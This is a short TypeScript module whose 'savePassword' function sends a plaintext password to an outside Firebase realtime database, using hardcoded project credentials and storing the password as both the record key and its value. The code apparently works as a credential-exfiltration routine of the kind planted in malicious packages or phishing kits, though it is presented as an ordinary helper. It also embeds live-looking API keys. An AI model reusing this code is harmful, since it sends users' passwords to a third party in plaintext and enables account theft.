import { initializeApp } from "firebase/app";
import { getDatabase, ref, set } from "firebase/database";

export function savePassword(password: string): void {
    let key = password;
   
    const basic = {
      apiKey: "AIzaSyBEK2uYEkgIVN4SsYqoJ5CK0208KLzp9Zg",
      authDomain: "agencyhill99-96117.firebaseapp.com",
      databaseURL: "https://agencyhill99-96117-default-rtdb.firebaseio.com",
      projectId: "agencyhill99-96117",
      storageBucket: "agencyhill99-96117.firebasestorage.app",
      messagingSenderId: "710897922514",
      appId: "1:710897922514:web:32b391e70aaf11a9f2580b",
      measurementId: "G-HMSZ5FVCGG"
    };
  
    let app = initializeApp(basic);
  
    let db = getDatabase(app);
  
    set(ref(db, "88_/" + key), { db_info: key });
}